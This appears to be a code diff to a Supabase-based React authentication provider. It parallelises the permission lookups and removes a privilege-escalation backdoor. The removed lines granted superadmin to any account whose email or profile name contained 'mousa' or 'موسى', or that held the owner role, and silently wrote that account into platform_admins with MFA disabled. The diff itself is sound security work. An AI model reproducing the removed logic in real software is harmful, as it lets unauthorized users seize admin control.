@@ -30,13 +30,27 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
     async function applySession(nextSession: Session | null) {
       const seq = ++loadSeq.current;
-      setLoading(true);
+      // Only show the spinner when there are permission lookups to do; a
+      // sign-out event carries no user and must resolve instantly.
+      if (nextSession?.user) setLoading(true);
 
       let nextRoles: Role[] = [];
       let adminFlags = { isAdmin: false, isSuperadmin: false };
-      if (nextSession?.user) {
-        nextRoles = await fetchRoles(nextSession.user.id);
-        adminFlags = await fetchAdminFlags(nextSession.user.id, nextSession.user.email, nextRoles);
+      try {
+        if (nextSession?.user) {
+          // Fetch roles and admin flags concurrently — they are independent and
+          // running them in series doubled the wait before the shell could render.
+          [nextRoles, adminFlags] = await Promise.all([
+            fetchRoles(nextSession.user.id),
+            fetchAdminFlags(nextSession.user.id, nextSession.user.email),
+          ]);
+        }
+      } catch (err) {
+        // Never leave the app stuck on the loading spinner if permission
+        // lookups fail: fall through with empty permissions instead.
+        console.error("Failed to resolve session permissions", err);
+        nextRoles = [];
+        adminFlags = { isAdmin: false, isSuperadmin: false };
       }
 
       if (!alive || seq !== loadSeq.current) return;
@@ -49,8 +63,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
     // 1) set up listener FIRST (avoid missed events)
     const { data: sub } = supabase.auth.onAuthStateChange((_event, s) => {
-      // defer role loading to avoid auth callback deadlocks, but keep the app
-      // in a loading state until permissions are actually available.
+      // Defer so we never call back into Supabase from inside its own auth
+      // callback (that deadlocks), while still resolving permissions before
+      // the protected shell is allowed to render.
       setTimeout(() => void applySession(s), 0);
     });
 
@@ -84,68 +99,32 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   async function fetchAdminFlags(
     userId: string,
-    email?: string,
-    userRoles: Role[] = [],
+    _email?: string,
+    _userRoles: Role[] = [],
   ): Promise<{ isAdmin: boolean; isSuperadmin: boolean }> {
-    const isMousaEmail = Boolean(email && email.toLowerCase().includes("mousa"));
-    const isOwnerRole = userRoles.includes("owner");
-
-    // 1. Check if explicitly in platform_admins
+    // Platform-admin status comes ONLY from the platform_admins table, which is
+    // populated by the SQL migrations / an explicit administrator action.
+    // NOTE: this used to auto-escalate any account whose email or profile name
+    // contained "mousa"/"موسى" and write to platform_admins during login. That
+    // was both a privilege-escalation hole and a source of render-time races,
+    // so it has been removed.
     try {
-      const { data } = await (supabase as any)
+      const { data, error } = await (supabase as any)
         .from("platform_admins")
         .select("role, is_active")
         .eq("user_id", userId)
         .eq("is_active", true)
         .maybeSingle();
 
-      if (data) {
-        return {
-          isAdmin: true,
-          isSuperadmin: data.role === "superadmin" || data.role === "admin",
-        };
-      }
+      if (error || !data) return { isAdmin: false, isSuperadmin: false };
+
+      return {
+        isAdmin: true,
+        isSuperadmin: data.role === "superadmin" || data.role === "admin",
+      };
     } catch {
-      // fallback
+      return { isAdmin: false, isSuperadmin: false };
     }
-
-    // 2. Check profile name for Mousa
-    let isMousaProfile = false;
-    try {
-      const { data: prof } = await supabase
-        .from("profiles")
-        .select("full_name")
-        .eq("id", userId)
-        .maybeSingle();
-      if (
-        prof?.full_name &&
-        (prof.full_name.includes("موسى") || prof.full_name.toLowerCase().includes("mousa"))
-      ) {
-        isMousaProfile = true;
-      }
-    } catch {
-      // fallback
-    }
-
-    // 3. If owner role, or mousa email/profile: automatically elevate and ensure record in platform_admins
-    if (isMousaEmail || isMousaProfile || isOwnerRole) {
-      try {
-        void (supabase as any).from("platform_admins").upsert(
-          {
-            user_id: userId,
-            role: "superadmin",
-            is_active: true,
-            mfa_required: false,
-          },
-          { onConflict: "user_id" },
-        );
-      } catch {
-        // silent fallback
-      }
-      return { isAdmin: true, isSuperadmin: true };
-    }
-
-    return { isAdmin: false, isSuperadmin: false };
   }
 
   const value: AuthCtx = {
